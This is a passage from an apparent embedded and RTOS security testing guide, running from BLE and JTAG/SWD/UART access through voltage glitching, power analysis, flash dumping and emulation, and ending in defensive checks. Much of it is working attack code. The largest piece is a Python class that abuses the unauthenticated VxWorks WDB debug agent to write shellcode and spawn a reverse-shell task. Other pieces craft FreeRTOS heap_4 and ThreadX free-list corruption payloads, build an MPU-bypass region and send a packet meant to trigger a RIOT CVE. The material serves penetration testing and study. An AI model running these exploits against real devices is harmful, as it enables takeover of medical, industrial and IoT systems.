# Common Wi-Fi devices: CC3220, CC3235 (Wi-Fi + M4 Cortex)

# Identify BLE device:
sudo hcitool -i hci0 lescan
#   AA:BB:CC:DD:EE:FF SimplePeripheral

# CC26xx BLE attacks:
# - Default pairing PIN (often "000000" or "123456" in dev images)
# - Over-the-Air Device Firmware Update (OTA DFU) without signature
# - Custom GATT services with buffer overflows
# - JTAG access via the cJTAG interface (different pinout than standard JTAG)

# cJTAG enumeration (TI's compact JTAG — uses 2 pins instead of 4):
# Use OpenOCD with the cfg:
cat > /tmp/cc26xx.cfg <<EOF
adapter driver ftdi
ftdi_vid_pid 0x0403 0x6010
ftdi_layout_init 0x0008 0x000b
transport select jtag
jtag newtap cc26xx cpu -irlen 6 -expected-id 0x0B99A02F
EOF
openocd -f /tmp/cc26xx.cfg
```

---

## 10. MicroC/OS, NuttX, RIOT, Contiki-NG

### MicroC/OS-II and III

```text
MicroC/OS-II (uC/OS-II) and MicroC/OS-III are Micrium's RTOSes
(now owned by Silicon Labs).

Properties:
- No MMU/MPU support (II), MPU support added in III
- Flat address space — task compromise = full device compromise
- Fixed-priority preemptive scheduler
- Compile-time task configuration
- No standard TCP/IP stack (OEM integrates their own)

Used in: medical devices (Micrium's biggest market), industrial PLCs,
aerospace (some older designs).

Attack surface:
- Custom TCP/IP stacks (BSD-derived, lwIP, uIP — depends on OEM)
- OSCI / OSCIII specific: heap overflow in OSMemPut
- Scheduler abuse: high-priority task starvation

OSMemPut exploitation:
- Free list is singly-linked with predictable layout
- Overwriting a free block's Next pointer gives arbitrary write
- Similar to ThreadX block_pool pattern (see §6)
```

### NuttX

```bash
# NuttX is a POSIX-compliant RTOS (now Apache NuttX)
# Used in: PX4 drone autopilot, some smart watches, IoT gateways
# Linux-like POSIX API (fork, exec, sockets, pthread)

# Identify NuttX in firmware:
strings firmware.bin | grep -E "(NuttX|nuttx|nx_)"
#   NuttX-12.3.0
#   nx_start_application
#   NuttShell (NSH)

# NuttX ships a "NuttShell" (nsh) — bash-like CLI over UART/TELNET
# Default telnet port: 23
nc <target-ip> 23
#   NuttShell (NSH) NuttX-12.3.0
#   nsh> help
#   Help commands:
#     ?           echo        free        mv          sleep
#     cat         exec        help        mw          test
#     cd          exit        hexdump     ps          umount
#     cp          export      kill        pwd         unset
#     ...

# Memory write via nsh 'mw' command (memory write):
#   mw 0x20000000 0xDEADBEEF
# Reads/writes any address — gives full RCE on any NuttX device with nsh exposed

# Default credentials: NuttX does NOT set a root password by default
# (unless CONFIG_NSH_LOGINPASSWD=y is enabled in defconfig)

# Identify NuttX defconfig settings
strings firmware.bin | grep "CONFIG_NSH"
#   CONFIG_NSH_TELNET_LOGIN=y     # if y, login is required
#   CONFIG_NSH_ROMFS=y
#   CONFIG_NSH_SCRIPTLET_NAME="init"
```

### RIOT OS

```bash
# RIOT is a free RTOS for IoT (Linus Torvalds endorsed in 2013)
# Used in: 6LoWPAN mesh networks, smart city sensors, research deployments
# Default shell: 'shell' over UART

# Identify RIOT:
strings firmware.bin | grep -E "(RIOT|riot|gnrc|sysinit)"
#   RIOT OS
#   main(): This is RIOT! (Version: 2024.01)

# RIOT networking (GNRC): TCP/IP stack with 6LoWPAN
# Vulnerabilities:
# - CVE-2019-16525  gnrc_ipv6_nib heap overflow
# - CVE-2019-16526  gnrc_icmpv6 heap overflow
# - CVE-2021-42771  ndp_lazy_mtu rif rif (memory leak)
# - CVE-2024-3528   net/gnrc heap overflow

# Fuzzing RIOT over TAP interface (native build):
cd ~/tools/RIOT/examples/gnrc_networking
make BOARD=native all
./bin/native/gnrc_networking.elf tap0
# Now reachable via the tap0 interface
ping6 -c 3 fe80::1234%tap0

# Send oversized ICMPv6 to trigger CVE-2019-16526:
python3 << 'EOF'
from scapy.all import IPv6, ICMPv6EchoRequest, send
pkt = IPv6(dst='fe80::1234') / ICMPv6EchoRequest(data=b'A' * 2000)
send(pkt)
EOF
```

### Contiki-NG

```bash
# Contiki-NG is the IoT-focused fork of Contiki (6LoWPAN, CoAP, RPL)
# Used in: smart meters, environmental sensors, Tmote Sky / Zolertia Z1
# Default shell: 'shell' over UART

# Identify Contiki-NG:
strings firmware.bin | grep -E "(Contiki|contiki|process_thread|uIP|rpl-)"
#   Contiki-NG 4.8
#   Starting Contiki-NG
#   uIP TCP/IP stack

# Contiki-NG vulnerabilities:
# - CVE-2018-16536  uIP RPL routing overflow
# - CVE-2018-16537  uIP ICMPv6 overflow
# - CVE-2020-17439  RPL rank overflow
# - CVE-2023-28074  CoAP option parsing overflow

# Fuzzing CoAP server (port 5683 UDP):
python3 << 'EOF'
from scapy.all import IP, UDP, Raw, send
# CoAP packet: version 1, type 0 (CON), token length 0, code 0x01 (GET)
coap_header = bytes.fromhex('4000BBAA')  # ver=1, tkl=0, code=0.01, msgid=0xBBAA
coap_payload = b'/.well-known/core'
pkt = IP(dst='192.168.1.60') / UDP(sport=5683, dport=5683) / Raw(load=coap_header + coap_payload)
send(pkt)
EOF

# Contiki-NG shell over SLIP (serial line IP)
# On Linux, use 'tunslip6' to bridge:
sudo tunslip6 -L -v2 -t /dev/ttyUSB0 fd00::1/64
# Creates a tun0 interface for the Contiki device
```

---

## 11. Hardware Attack Methods — JTAG, SWD, UART, Glitching, Side-Channel

### JTAG enumeration via JTAGulator

```text
JTAGulator (Joe Grand) — open-source hardware tool for discovering on-chip
debug interfaces from unknown PCBAs. Scans up to 24 channels to find:
- TCK (Test Clock)
- TMS (Test Mode Select)
- TDI (Test Data In)
- TDO (Test Data Out)
- TRST (Test Reset, optional)
- Device IDCODE / IR length

Usage:
1. Connect JTAGulator to candidate pins on the target PCBA
2. Power on the target
3. At the JTAGulator prompt:
   > j      (JTAG enumeration)
   > 24     (scan 24 channels)
   > 0      (starting pin = 0)
4. JTAGulator brute-forces all 4-permutations per channel set
5. Reports found TCK/TMS/TDI/TDO and the device IDCODE

Decode IDCODE examples:
  0x4BA00477  ARM Cortex-M4F with SW-DP (Debug Access Port)
  0x0B99A02F  TI CC26xx (cJTAG)
  0x06410041  Atmel AT91SAM9263
  0x0BC11477  ARM Cortex-M0+
```

### SWD enumeration (ARM)

```bash
# ARM SWD (Serial Wire Debug) is a 2-pin alternative to JTAG:
# SWCLK (clock) + SWDIO (data) + (optional) SWO (trace)

# Using OpenOCD with J-Link:
cat > /tmp/swd_jlink.cfg <<EOF
adapter driver jlink
transport select swd
swd newdap target cpu -irlen 2 -expected-id 0x2BA01477
dap create dap.dap -chain-position target.cpu
target create target.cpu cortex_m -dap dap.dap
EOF
openocd -f /tmp/swd_jlink.cfg -c 'init; targets; dap info; resume'

# Reading the Debug Authentication Mode (DAM):
# ARMv7-M: DHCSR (Debug Halting Control and Status Register) at 0xE000EDF0
# ARMv8-M: Same + Secure Debug Control Register
# If DHCSR bit 0 (DBGKEY) is writable: debug is OPEN (no auth required)
# If DAM = 0x0:  open debug (no auth)
# If DAM = 0x1:  auth required (key exchange via DPM)
# If DAM = 0x2:  debug disabled (fuse)

# Test with OpenOCD:
openocd -f /tmp/swd_jlink.cfg -c 'init; mww 0xE000EDF0 0xA05F0003; mdw 0xE000EDF0; resume'
#   0xe000edf0: 00030003
# DHCSR = 0x00030003 -> DBGKEY valid, C_DEBUGEN=1, C_HALT=1, S_HALT=1
# Debug is OPEN.

# If DHCSR returns 0x00000000 -> debug is DISABLED.
# Workaround: glitch the DAM fuse check (see §11 fault injection)
```

### UART enumeration

```bash
# UART has 4 pins: TX, RX, GND, VCC
# Identify via Bus Pirate:
picocom -b 115200 /dev/ttyUSB0
# Bus Pirate mode menu: m
# Select: 3 (UART)
# Speeds to try: 9600, 38400, 57600, 115200, 230400
# Bit/Parity/Stop: 8N1

# Once connected, watch for boot log:
#   U-Boot 2018.05-...
#   Booting Linux on physical CPU 0x0
#   VxWorks 6.9.4.1 kernel: BSP

# Common UART console autobaud sequences:
# - Send '\r\n' (CR+LF) at each baud rate
# - Device responds with a prompt if autobaud succeeded

# Identify UART TX/RX pins (TX has signal, RX is silent):
# Use a logic analyzer (Saleae, sigrok) to find the active pin during boot

# Use Shikra for UART discovery:
shikra --uart-scan --pins 0-7
```

### OpenOCD — full flash dump

```bash
# Once SWD/JTAG access is established, dump the full flash:

cat > /tmp/dump_flash.tcl <<EOF
init
halt
flash probe 0
flash info 0
flash read_bank 0 /tmp/flash_dump.bin 0 0x100000
EOF
openocd -f /tmp/swd_jlink.cfg -f /tmp/dump_flash.tcl -c 'shutdown'

# Result: /tmp/flash_dump.bin (1MB starting from flash base)
# For multi-bank flash, repeat per bank

# Manual dump via GDB (slower but flexible):
arm-none-eabi-gdb -ex 'target extended-remote :3333' \
  -ex 'monitor reset halt' \
  -ex 'dump binary memory /tmp/flash.bin 0x08000000 0x08100000' \
  -ex 'detach' \
  -ex 'quit'
```

### OpenOCD — RTOS awareness

```bash
# OpenOCD has built-in RTOS awareness for FreeRTOS, ThreadX, Zephyr, uC/OS-III, NuttX, QNX.
# This means you can see tasks, stacks, and per-task CPU state in GDB.

cat > /tmp/swd_rtos.cfg <<EOF
adapter driver jlink
transport select swd
swd newdap target cpu -irlen 2 -expected-id 0x2BA01477
dap create dap.dap -chain-position target.cpu
target create target.cpu cortex_m -dap dap.dap -rtos FreeRTOS
EOF
openocd -f /tmp/swd_rtos.cfg -c 'init; targets; resume'

# In GDB:
arm-none-eabi-gdb -ex 'target extended-remote :3333'
(gdb) info threads
#   Id   Target Id          Frame
#   * 1  Thread 1 (IDLE)    prvIdleTask (...)
#     2  Thread 2 (IP-task) prvProcessIPEvents (...)
#     3  Thread 3 (TCP-RX)  prvTCPMakeSureWaitQueueNotNull (...)
#     4  Thread 4 (TCP-TX)  xQueueReceive (...)
# (gdb) thread 2
# (gdb) bt
#   #0  prvProcessIPEvents (ulTask=0x4152) at FreeRTOS_IP.c:1845
#   #1  prvIPTask (pvParameters=0x0) at FreeRTOS_IP.c:1710

# RTOS awareness requires the symbol file from the build
(gdb) symbol-file /tmp/firmware.elf
```

### ChipWhisperer — voltage glitching

```python
# ChipWhisperer (NewAE) is the canonical SCA/fault-injection platform.
# Supports: voltage glitching, clock glitching, power analysis (DPA/CPA)

import chipwhisperer as cw

# Connect to ChipWhisperer-Lite (CW1173) or Husky (CW321)
scope = cw.scope()
target = cw.target(scope, cw.targets.SimpleSerial)

# Configure for voltage glitching
scope.glitch.clk_src = 'clkgen'   # use internal clock generator
scope.glitch.width = 5.5          # glitch width (ns)
scope.glitch.offset = -7.2        # glitch offset (ns from clock edge)
scope.glitch.trigger_src = 'manual'
scope.glitch.repeat = 3           # 3 clock cycles
scope.glitch.output = 'glitch_only'
scope.io.glitch_hp = True         # high-power glitch output
scope.io.glitch_lp = False

# Set target clock
scope.clock.clkgen_freq = 7.37e6  # 7.37 MHz (STM32F4 default HSI)

# Trigger pattern: glitch at a specific cycle after a trigger event
# Example: target sends a character over UART when it starts secure boot verify
# Use this character as the trigger
scope.trigger.triggers = 'tio1'
scope.glitch.trigger_src = 'ext_trigger'

# Glitch loop: sweep width and offset
for width_ns in [3, 4, 5, 5.5, 6, 7, 8]:
    for offset_ns in [-10, -7.5, -5, -2.5, 0, 2.5, 5]:
        scope.glitch.width = width_ns
        scope.glitch.offset = offset_ns
        target.reset()
        scope.arm()
        target.simpleserial_write('a', b'\x00')
        ret = scope.capture()
        if not ret:
            # Check if target skipped the secure boot check
            response = target.simpleserial_read('r', 4)
            if response == b'\x01\x00\x00\x00':  # bypassed signature check
                print(f'[+] GLITCH SUCCESS: width={width_ns} offset={offset_ns}')
                break
```

### ChipWhisperer — power analysis (DPA/CPA)

```python
# Differential Power Analysis (DPA) / Correlation Power Analysis (CPA)
# on a software AES implementation to recover the key.

import chipwhisperer as cw
import numpy as np

scope = cw.scope()
target = cw.target(scope, cw.targets.SimpleSerial)
scope.adc.samples = 2400
scope.adc.offset = 0
scope.gain.db = 25

# Capture N traces, each with a random plaintext
traces = []
plaintexts = []
N = 5000
for i in range(N):
    ktp = cw.ktp.Basic()
    key, text = ktp.next()
    target.simpleserial_write('p', text)
    ret = scope.capture()
    if not ret:
        trace = scope.get_last_trace()
        traces.append(trace)
        plaintexts.append(text)

traces = np.array(traces)
plaintexts = np.array(plaintexts)

# CPA attack on first round SBox
def cpa_attack(traces, plaintexts, key_guess_range=256):
    """CPA attack on AES first round."""
    from chipwhisperer.analyzer import cpa
    cpa_obj = cpa.CPA(cpa.algorithms.Xor(), cpa.models.AESSbox())
    cpa_obj.trace_range = (0, N)
    cpa_obj.point_range = (0, 2400)
    cpa_obj.plot_data_callback = None
    cpa_obj.set_traces(traces, plaintexts, key_guess_range)
    results = cpa_obj.process()
    return results

# Recover the first byte of the AES key
results = cpa_attack(traces, plaintexts, key_guess_range=256)
print(f'AES key byte 0: {results.argmax()}')
```

### GreatFET / HydraBus / Bus Pirate — SPI flash dump

```bash
# GreatFET — SPI flash dump
greatfet spi -r flash.bin --freq 1000000 --size 0x100000
# Reads 1MB of SPI flash at 1MHz

# HydraBus — SPI flash dump (interactive)
hydrabus
# Mode menu: m
# Select: SPI
# Frequency: 1000000 (1MHz)
# Then at the hydra> prompt:
#   cs low
#   03 00 00 00      # SPI read command + 24-bit address
#   r 65536          # read 64KB
#   cs high
# Output: hex dump

# Bus Pirate — SPI flash dump (over UART)
picocom -b 115200 /dev/ttyUSB0
# Bus Pirate prompt:
# HiZ>m    (mode menu)
# 5 (SPI)
# ... accept defaults ...
# SPI> [0x03 0x00 0x00 0x00 r:256]   # read 256 bytes starting at address 0
# Result: hex dump

# flashrom — multi-programmer SPI flash tool
flashrom -p ch341a_spi -r flash_dump.bin
# CH341A is a $5 USB-to-SPI programmer; widely used for reflashing BIOS/UEFI
```

### SWD exploitation — dumping FreeRTOS task state

```python
# Once SWD access is established, dump the FreeRTOS task control blocks (TCBs)
# This is the "snapshot" view of the RTOS state

import socket
import struct

# OpenOCD GDB server connection
class OpenOCDGDB:
    def __init__(self, host='localhost', port=3333):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))

    def cmd(self, c):
        # Build GDB remote serial protocol packet
        checksum = sum(c.encode()) & 0xFF
        packet = f'${c}#{checksum:02x}'
        self.s.sendall(packet.encode())
        # Wait for ack
        ack = self.s.recv(1)
        if ack != b'+':
            raise RuntimeError(f'no ack: {ack}')
        # Read response
        response = b''
        while True:
            ch = self.s.recv(1)
            if ch == b'#':
                self.s.recv(2)  # ignore checksum
                break
            response += ch
        return response

    def read_mem(self, addr, length):
        # GDB 'm' packet
        hex_len = format(length, 'x')
        hex_addr = format(addr, 'x')
        resp = self.cmd(f'm{hex_addr},{hex_len}')
        return bytes.fromhex(resp.decode())

gdb = OpenOCDGDB()

# Read the FreeRTOS pxCurrentTCB pointer
# (symbol address from the firmware's .elf file)
pxCurrentTCB_addr = 0x20000000  # example address
pxCurrentTCB_val = struct.unpack('<I', gdb.read_mem(pxCurrentTCB_addr, 4))[0]
print(f'pxCurrentTCB = 0x{pxCurrentTCB_val:08x}')

# Read the TCB structure (sizeof(TCB_t) on Cortex-M is ~0x80 bytes)
tcb = gdb.read_mem(pxCurrentTCB_val, 0x80)
top_of_stack = struct.unpack('<I', tcb[0:4])[0]
task_name = tcb[0x38:0x48].rstrip(b'\x00').decode()
print(f'Task name: {task_name}, topOfStack: 0x{top_of_stack:08x}')

# Read the saved register context (Cortex-M exception frame)
frame = gdb.read_mem(top_of_stack, 0x20)
r0, r1, r2, r3, r12, lr, pc, xpsr = struct.unpack('<IIIIIIII', frame)
print(f'r0=0x{r0:08x} r1=0x{r1:08x} r2=0x{r2:08x} r3=0x{r3:08x}')
print(f'pc=0x{pc:08x} lr=0x{lr:08x} xpsr=0x{xpsr:08x}')
```

---

## 12. Software Methods — Debug Agent, MPU Bypass, Heap Corruption, Scheduler

### Debug agent — WDB MODE_ANY escalation

```python
# The WDB agent's most powerful primitive is TASK_SPAWN (procedure 11)
# in WDB_MODE_ANY (no authentication).
# Combined with CTXT_WRITE (procedure 8), an attacker can:
# 1. Write arbitrary code to a code-cave or heap address
# 2. Spawn a task that executes the code
# 3. The task runs with kernel-equivalent privileges (VxWorks kernel mode)

# Full exploit chain:

import socket, struct

class VxWorksWDB:
    def __init__(self, target_ip, port=17185):
        self.target_ip = target_ip
        self.port = port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.s.settimeout(2.0)
        self.xid = 0xDEADBEEF

    def call(self, proc, payload=b''):
        rpc = struct.pack('>IIIIIIIIII',
            self.xid, 0, 2,
            0x55555555, 1, proc,
            0, 0, 0, 0) + payload
        self.s.sendto(rpc, (self.target_ip, self.port))
        try:
            data, _ = self.s.recvfrom(65535)
            return data
        except socket.timeout:
            return None

    def ping(self):
        return self.call(21) is not None

    def read_mem(self, addr, length=256):
        payload = struct.pack('>III', 0, addr, length)
        reply = self.call(7, payload)
        if reply:
            # Skip RPC header (~40 bytes)
            return reply[40:]
        return None

    def write_mem(self, addr, data):
        pad = (4 - len(data) % 4) % 4
        payload = struct.pack('>III', 0, addr, len(data)) + data + b'\x00' * pad
        return self.call(8, payload)

    def spawn_task(self, entry, name=b'pwn', priority=100, stack_size=4096):
        name_padded = name + b'\x00' * (32 - len(name))
        payload = name_padded + struct.pack('>IIIII', entry, priority, 0, stack_size, 0)
        return self.call(11, payload)

# Example: spawn a reverse shell task
wdb = VxWorksWDB('192.168.1.10')

if wdb.ping():
    print('[+] WDB agent reachable, MODE_ANY likely enabled')

    # Step 1: write ARM reverse-shell shellcode to SRAM
    # (Example: ARM Cortex-A thumb-2 reverse shell)
    shellcode = bytes.fromhex(
        '01e0a0e1'   # mov r0, r1 (placeholder)
        + '0030a0e3'  # mov r3, #0
        + '003000ef'  # svc 0
        # ... actual shellcode here ...
    )

    # Write to a code-cave (typically the end of the .text section)
    wdb.write_mem(0x00100000, shellcode)

    # Step 2: spawn a task that executes the shellcode
    wdb.spawn_task(0x00100000 | 1)  # |1 for thumb mode
    print('[+] Task spawned; check listener')
```

### MPU bypass via heap corruption

```python
# MPU (Memory Protection Unit) on Cortex-M enforces per-task memory regions.
# If FreeRTOS is built with configUSE_MPU_WRAPPERS=1 AND tasks are created
# with xTaskCreateRestricted, each task has its own MPU region set.
#
# Bypass: corrupt a task's MPU region configuration in its TCB.
# The TCB's xRegion field (an array of MemoryRegion_t structs) defines the regions.
# If we can overwrite xRegion[0] to grant access to all of SRAM, we escape the sandbox.

# TCB_t layout (FreeRTOS 10.x):
#   topOfStack (uint32)       — offset 0
#   pxTaskTag (uint32)        — offset 4 (was xMPUSettings in older versions)
#   pcTaskName[16]            — offset 0x10 (varies)
#   ...
#   xRegions[3]               — MPU regions (MemoryRegion_t = {pvBaseAddress, ulLengthInBytes, ulParameters})
#   ulRunTimeCounter
#   ...

# Each MemoryRegion_t is 12 bytes (3 uint32s)
# ulParameters: bit 0 = EXECUTE / bit 1 = WRITE / bit 4-7 = SIZE / bit 16-23 = SUBREGION_DISABLE

def craft_universal_mpu_region():
    """Craft an MPU region that grants RWX access to all of SRAM."""
    base_address = 0x20000000  # typical Cortex-M SRAM base
    # Length: encoded as 2^(N+1) bytes, so 0x1F = 4GB
    length = 0x1F  # 4GB region
    # Parameters: enable, RWX, size, subregion disable = 0
    parameters = 0x03  # ENABLE | RWX (simplified; real encoding varies by ARMv7-M/ARMv8-M)
    return struct.pack('<III', base_address, length, parameters)

# PoC: after heap overflow, write the universal MPU region to a task's xRegions[0]
universal_region = craft_universal_mpu_region()
# target_tcb_addr + xRegions_offset = location to write
# write_memory(target_tcb_addr + 0x40, universal_region)
```

### Heap corruption — ThreadX block pool

```python
# ThreadX block pool free list corruption (see §6 for details)
# Trigger: heap overflow into the next block's free list header

# 1. Allocate two adjacent blocks (A and B)
# 2. Trigger overflow in A to overwrite B's tx_next pointer
#    (point it to an arbitrary address we want to corrupt later)
# 3. Release A: pool->head = A
# 4. Allocate: returns A, pool->head = A->next = B
# 5. Allocate: returns B, pool->head = B->next = OUR_ADDRESS
# 6. Allocate: returns OUR_ADDRESS — caller writes payload to OUR_ADDRESS

# This is the canonical ThreadX heap exploit pattern.
# Useful for: overwriting the system's function pointer table (SFT),
# corrupting the HardFault vector, or hijacking a task's PC.
```

### Heap corruption — FreeRTOS heap_4.c

```python
# FreeRTOS heap_4.c uses a coalescing first-fit allocator.
# Each free block has a header:
#   BlockLink_t {
#     size_t xBlockSize;     // includes header
#     struct BlockLink_t *pxNextFreeBlock;
#   }
# The free list head (xStart) is a global variable.
#
# Attack: overflow a heap allocation's payload to overwrite the next block's
# BlockLink_t header. On the next free() of that block, the unlink operation
# writes our controlled pxNextFreeBlock pointer to xStart.pxNextFreeBlock.
# Subsequent malloc() returns the attacker-controlled address.

# BlockLink_t layout (32-bit):
BLOCK_SIZE_OFFSET = 0
NEXT_BLOCK_OFFSET = 4

def heap4_unlink_payload(target_addr, target_size=0x100):
    """Craft a payload to overflow into the next block's BlockLink_t."""
    # The new pxNextFreeBlock points to target_addr
    # The size is set to bypass the coalescing check (size_t > 0)
    fake_block_header = struct.pack('<II', target_size | 0x80000000, target_addr)
    return fake_block_header

# After writing this to the heap, trigger a free() on the corrupted block.
# The allocator's unlink: xStart.pxNextFreeBlock = pxBlock->pxNextFreeBlock
# = target_addr
# Next pvPortMalloc() returns target_addr as a writable region.
```

### Scheduler priority inversion

```python
# Priority inversion: a low-priority task holds a resource needed by a high-priority
# task, blocking it. If a medium-priority task preempts the low-priority holder,
# the high-priority task is effectively starved.
#
# FreeRTOS mitigates this with xSemaphoreCreateMutex (which inherits priority).
# But xSemaphoreCreateBinary does NOT inherit priority — common bug.
#
# Detection: inspect the firmware for xSemaphoreCreateBinary used for
# shared resources between tasks of different priority.

import re

# Find semaphore creation calls
with open('firmware_strings.txt') as f:
    content = f.read()

binary_mutex_uses = re.findall(r'xSemaphoreCreateBinary\(\).*?//\s*([^}]+)', content)
for use in binary_mutex_uses[:10]:
    print(f'  [!] Binary semaphore used (no priority inheritance): {use}')

# Look for the priority inheritance functions to verify they're used:
inheritance_calls = re.findall(r'vTaskPriorityInherit|vTaskPriorityDisinherit', content)
print(f'Found {len(inheritance_calls)} priority inheritance calls')
# If 0 -> no priority inheritance, device is vulnerable to inversion DoS
```

### Scheduler — task starvation DoS

```python
# A high-priority task that never yields will starve all lower-priority tasks.
# If configUSE_TIME_SLICING is disabled (default is enabled), even tasks of
# equal priority can be starved by one that doesn't yield.
#
# Attack: compromise a task (via heap overflow or debug agent) and have it
# enter an infinite loop. The watchdog (if present) will eventually fire;
# if not, the device hangs.

# PoC (after gaining execution via WDB):
def starvation_payload():
    """Infinite loop at high priority to starve lower-priority tasks."""
    while True:
        pass

# Inject this as a task spawned at priority configMAX_PRIORITIES - 1
```

---

## 13. Emulation & Symbolic Execution — Renode, QEMU, angr

### Renode — multi-node RTOS emulation

```text
Renode (Antmicro) is the canonical RTOS emulator. Supports:
- ARM Cortex-M0/M0+/M3/M4/M7/M23/M33
- ARM Cortex-A (some)
- RISC-V (RV32, RV64)
- SPARC, PowerPC (limited)

Renode's strength is multi-node: emulate the SoC, the external flash,
a debug probe, and a serial console simultaneously.

.rese script (Renode script file) example for Zephyr on STM32F4:
```

```
# Zephyr on STM32F4Discovery — Renode script (.resc)
:mmio_init
emulation CreateSTM32F4 "stm32"

include @zephyr/memmap.repl

stm32 LoadELF @zephyr.elf

# Set PC to the reset vector
cpu SetRegister PC 0x08000000

# Enable semihosting (for stdio to host)
cpu EnableSemihosting

# Serial console
showAnalyzer uart0

emulation RunFor 0x1
```

```bash
# Run the script:
renode zephyr_stm32f4.resc

# At the Renode prompt:
# (stm32) start
# (stm32) machine ShowLogger
# ... boot log ...
```

### Renode — multi-RTOS debugging

```bash
# Renode has built-in support for FreeRTOS, Zephyr, ThreadX awareness
# (similar to OpenOCD's RTOS awareness)

# Enable RTOS awareness:
(renode) cpu SetRegister ARCH ARMv7M
(renode) rtos SetType FreeRTOS
(renode) rtos ListTasks
#   Task ID    Priority    StackBase    StackTop    Name
#   0x20000000 1           0x20001000   0x20001200  IDLE
#   0x20000500 2           0x20001500   0x20001780  IP-task
#   0x200005A0 1           0x20001500   0x20001780  TCP-RX
# (renode) rtos SwitchTo IP-task
# (renode) cpu GetRegister
#   r0=0x00000001 r1=0x20000000 r2=0x00001000 r3=0x00000004 ...
```

### QEMU system — bare-metal RTOS emulation

```bash
# QEMU system mode supports ARM Cortex-M (lm3s6965evb, stm32vldiscovery, netduinoplus2)
# and ARM Cortex-A (raspberrypi, vexpress-a9)

# Boot NuttX on QEMU LM3S6965:
qemu-system-arm -M lm3s6965evb -kernel nuttx.bin -nographic -serial mon:stdio

# Boot Zephyr on QEMU Cortex-M3:
qemu-system-arm -M qemu_cortex_m3 -kernel zephyr.elf -nographic

# Boot FreeRTOS on QEMU vexpress-a9:
qemu-system-arm -M vexpress-a9 -m 128 -kernel freertos-demo.elf -nographic

# Networking: use TAP interface
qemu-system-arm -M lm3s6965evb -kernel nuttx.bin -nographic \
    -netdev tap,id=net0,ifname=tap0,script=no,downscript=no \
    -device stellaris_enet,netdev=net0
```

### angr — symbolic execution of WDB parser

```python
# angr is a Python-based symbolic execution framework.
# Use it to find input-to-crash paths in the WDB RPC parser.

import angr

# Load the VxWorks image
proj = angr.Project('vxworks_image.bin', load_options={
    'main_opts': {'backend': 'blob', 'arch': 'arm', 'base_addr': 0x00100000}
})

# Define the WDB RPC parser entry point
# (Found by Ghidra: wdbDbgArchLib.c -> wdbRpcDispatch)
parser_addr = 0x00102840

# Symbolic input: 4096 bytes (the maximum WDB RPC payload)
input_size = 4096
symbolic_input = angr.claripy.BVS('input', input_size * 8)

# Initial state: PC=parser_addr, R0=pointer to input buffer
state = proj.factory.blank_state(addr=parser_addr)
state.regs.r0 = 0x20000000  # input buffer address
state.memory.store(0x20000000, symbolic_input)

# Success: a path that calls system() / execve() / spawns a task
# (typical target: wdbTaskSpawn -> ... -> target_task)
# Failure: a path that returns cleanly (input rejected)

simgr = proj.factory.simulation_manager(state)
simgr.explore(find=lambda s: b'spawn' in s.posix.dumps(1),
              avoid=lambda s: b'rejected' in s.posix.dumps(1))

if simgr.found:
    found = simgr.found[0]
    solution = found.solver.eval(symbolic_input, cast_to=bytes)
    print(f'[+] Found input that reaches spawn: {solution[:128].hex()}')
else:
    print('[-] No path found within exploration budget')
```

### angr — FreeRTOS DHCP option parser

```python
import angr

# Find an input that crashes the FreeRTOS DHCP option parser
proj = angr.Project('freertos_image.elf')
parser_addr = 0x08001000  # vProcessDHCPoptions (example)

symbolic_input = angr.claripy.BVS('dhcp_options', 4096 * 8)
state = proj.factory.blank_state(addr=parser_addr)
state.regs.r0 = 0x20000000
state.memory.store(0x20000000, symbolic_input)

simgr = proj.factory.simgr(state)
simgr.explore(find=0x08002000, avoid=[0x08003000, 0x08004000])
# find: address reached only by an overflow
# avoid: address reached only by a clean return

if simgr.found:
    crash_input = simgr.found[0].solver.eval(symbolic_input, cast_to=bytes)
    print(f'Crash input: {crash_input[:64].hex()}')
```

---

## 14. Defensive Verification — MPU, Stack Canaries, Secure Boot

### Verify MPU enforcement

```bash
# Check FreeRTOSConfig.h for MPU enablement
grep -E "configUSE_MPU_WRAPPERS|configMAX_MPU_REGIONS" extracted_freertos/FreeRTOSConfig.h
#   #define configUSE_MPU_WRAPPERS 1
#   #define configMAX_MPU_REGIONS 8

# Check task creation: xTaskCreateRestricted vs xTaskCreate
grep -r "xTaskCreateRestricted\|xTaskCreate" extracted_freertos/
#   xTaskCreateRestricted(restricted_task_params, ...)  # MPU-enabled
#   xTaskCreate(unrestricted_task_func, ...)            # MPU-disabled
# If all tasks are created with xTaskCreate, MPU is effectively disabled
# even if configUSE_MPU_WRAPPERS=1.

# Check ThreadX MPU configuration
strings firmware.bin | grep -E "(tx_thread_mp_|TX_THREAD_USER)" | head -5
#   tx_thread_mpu_disable
#   tx_thread_mpu_enable
#   TX_THREAD_USER_MODE
# If absent, ThreadX is running without MPU enforcement.
```

### Verify stack canaries

```bash
# Check compiler flags in the build artifacts
strings firmware.bin | grep -E "(__stack_chk|stack-protector)" | head -5
#   __stack_chk_fail
#   __stack_chk_guard

# Check for compiler flags in the linker script or .map file
find _firmware.bin.extracted -name "*.map" | xargs grep -l "stack_chk"
#   _firmware.bin.extracted/firmware.map: __stack_chk_guard = .

# Check FreeRTOS port macros for stack overflow detection
grep -E "configCHECK_FOR_STACK_OVERFLOW|taskCHECK_FOR_STACK_OVERFLOW" \
    extracted_freertos/FreeRTOSConfig.h
#   #define configCHECK_FOR_STACK_OVERFLOW 2
# 0 = disabled, 1 = lightweight check, 2 = full check (recommended)

# Hardware stack guard (Cortex-M MPU)
strings firmware.bin | grep -E "z_arm_mpu_stack_guard|CONFIG_MPU_STACK_GUARD"
#   CONFIG_MPU_STACK_GUARD=y
```

### Verify secure boot chain

```bash
# Secure boot chain on Cortex-M typically:
# 1. Boot ROM (mask ROM, fused) validates first-stage bootloader signature
# 2. First-stage bootloader validates second-stage (RTOS) signature
# 3. (optional) Second-stage validates application images

# Verify in firmware strings:
strings firmware.bin | grep -E "(MCUboot|secure_boot|boot_signature|img_crypt)"
#   MCUboot v1.8.0
#   secure_boot_enabled
#   img_validate_sha256

# Check the public key embedded in the bootloader
strings boot_rom.bin | grep -A 30 "-----BEGIN PUBLIC KEY-----"
#   -----BEGIN PUBLIC KEY-----
#   MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAETK0j2K ...
#   -----END PUBLIC KEY-----
# Extract with openssl for verification
openssl ec -in public_key.pem -text -noout

# Verify a signed image with MCUboot's imgtool:
imgtool verify --key public_key.pem --header image_header.bin image.bin
```

### Verify ASLR-on-MCUs

```bash
